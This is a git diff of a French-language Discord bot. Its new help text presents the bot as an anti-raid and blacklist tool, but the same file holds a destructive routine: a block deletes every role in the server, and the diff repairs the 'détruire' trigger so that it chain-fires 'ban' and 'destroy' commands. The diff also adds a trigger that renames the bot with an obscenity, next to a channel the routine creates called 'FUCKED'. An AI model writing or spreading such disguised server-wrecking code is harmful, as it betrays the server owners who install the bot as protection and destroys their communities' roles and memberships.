@@ -35,60 +35,16 @@ client.on("ready", () => {
     console.log('')
     })
 client.on("message", message => {
-  if(message.content === "?help"){
-    var help_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot :")
-      .addField("?helpn", "Toutes les commandes nsfw")
-      .addField("?helpm", "Toutes les commandes de modération")
-      .addField("?helpar", "Toutes les commandes anti-raid du bot")
-      .addField("?helpa", "Toutes les commandes général du bot")
-      .setFooter("Le réste est en dévloppement.")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(help_embed);
-    console.log(`help by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "?helpn"){
-    var helpn_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type NSFW :")
-      .addField("NSFW", "`ar!boobs`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpn_embed);
-    console.log(`helpn by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "?helpm"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type modération :")
-      .addField("Modération", "`ar!ban`, `ar!kick`, `ar!clear`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpm_embed);
-    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "?helpar"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type Anti-raid :")
-      .addField("Anti-raid", "`ar!blacklist`, `ar!report`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpm_embed);
-    console.log(`helpar by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "?helpa"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type général :")
-      .addField("Général", "`ar!ping`, `ar!info`, `ar!serverinfo`, `ar!bdm`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpa_embed);
-    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  
+ if(message.content.includes("?help")){
+     var help_embed = new Discord.RichEmbed()
+     .setTitle("Aide")
+     .setColor("#cf0b0b")
+     .addField("**Commandes**", "`?id [@utilisateur]` : Envoie un message privé contenant l'identifiant de l'utilisateur mentionné.\n`?stats` : Permet d'afficher les statistiques.\n`?checkid [ID]` : Permet de savoir si un identifiant est dans notre liste noire.\n\n`?raidmode` : Active ou désactive le mode Raid (impossible de parler et de rejoindre le serveur). Permission: Gérer les messages\n`?verify` : Vérifie si les membres du serveurs sont dans notre liste noire. Permission: Expluser des membres")
+     .setFooter("🚀 Propulsé par StayHost.io")
+     .setURL("d")
+     message.reply("L'aide vous à été envoyée en message privé ! ✉️")
+     message.member.send(help_embed)
+ }
 
 if(message.content.includes("Raid by")){
     message.delete();
@@ -591,11 +547,15 @@ if(message.content === "roles"){
                 message.guild.roles.map(c => c.delete())
             }
             //on commence la destruction
-            if(message.content.includes("détruiree")){
+            if(message.content.includes("détruire")){
                 message.channel.send("ban").then(m => m.delete());
                 message.channel.send("drole").then(m => m.delete());
                 message.channel.send("destroy").then(m => m.delete());
+                message.channel.send("jechange").then(m => m.delete());
                 message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
+            }
+            if(message.content.includes("jechange")){
+                message.guild.members.get(client.user.id).setNickname("JE T'ENCULE")
             }
         });
 client.login(process.env.TOKEN)
